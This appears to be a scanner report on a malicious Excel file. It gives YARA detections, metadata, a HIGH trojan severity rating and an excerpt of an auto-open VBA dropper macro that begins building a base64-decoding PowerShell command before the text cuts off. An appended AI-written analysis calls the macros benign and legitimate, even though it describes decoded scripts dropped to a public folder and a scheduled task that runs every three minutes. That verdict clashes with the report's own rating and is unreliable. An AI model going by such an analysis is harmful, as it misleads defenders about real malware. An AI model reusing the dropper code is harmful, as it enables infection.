crowdsourced_yara_results.description: Detects Office droppers that include a notice to enable active content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: This signature detects base64 encoded Powershell directives.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation.
crowdsourced_yara_results.author: InQuest Labs

Detects PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence.

attributes.magic: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Name of Creating Application: Microsoft Excel, Create Time/Date: Sat Sep 16 00:00:00 2006, Last Saved Time/Date: Sat Jul 23 04:33:39 2016, Security: 0

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

macros.vba_code:
'source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html

Private Sub Workbook_Open()
    Call fireeye_Init
    Call fireeye_ShowHideSheets
End Sub

Sub fireeye_ShowHideSheets()
    If ActiveWorkbook.Worksheets(1).Visible Then
        Dim WS_Count As Integer
        Dim I As Integer
        WS_Count = ActiveWorkbook.Worksheets.Count
        For I = 1 To WS_Count
            ActiveWorkbook.Worksheets(I).Visible = True
        Next I
        ActiveWorkbook.Worksheets(1).Visible = False
        ActiveWorkbook.Worksheets(2).Activate
    End If
End Sub

Sub fireeye_Init()
    Set FireeyeVbs = ActiveWorkbook.Worksheets("Incompatible").Cells(1, 25)
    Set FireeyePs1 = ActiveWorkbook.Worksheets("Incompatible").Cells(1, 26)
    Set wss = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    pth = wss.ExpandEnvironmentStrings("%PUBLIC%")
    cmd = "powershell ""&{$f=[System.Text.Encoding]::UTF8.GetString([System.Convert
macros.properties: auto-open create-ole environ obfuscated powershell run-file

crowdsourced_ai_results.analysis:
The provided macros do not exhibit any signs of malicious intent. They primarily focus on manipulating the visibility of worksheets within the workbook and creating a scheduled task to run a VBScript file. Here's a detailed analysis of the macros:

1. ThisWorkbook.cls:
   - This module contains the initialization code that is executed when the workbook is opened.
   - It calls two subroutines: `fireeye_Init` and `fireeye_ShowHideSheets`.

2. fireeye_ShowHideSheets:
   - This subroutine controls the visibility of worksheets in the workbook.
   - It checks if the first worksheet is visible and then iterates through all worksheets, making them visible.
   - Finally, it hides the first worksheet and activates the second worksheet.

3. fireeye_Init:
   - This subroutine is responsible for setting up the scheduled task and creating the necessary files.
   - It extracts two base64-encoded strings from the worksheet cells and decodes them.
   - The decoded strings are saved as VBScript and PowerShell scripts in the Public Libraries folder.
   - A scheduled task is created to run the VBScript file every three minutes.

Overall, the macros appear to be part of a legitimate tool or application and do not exhibit any malicious behavior.
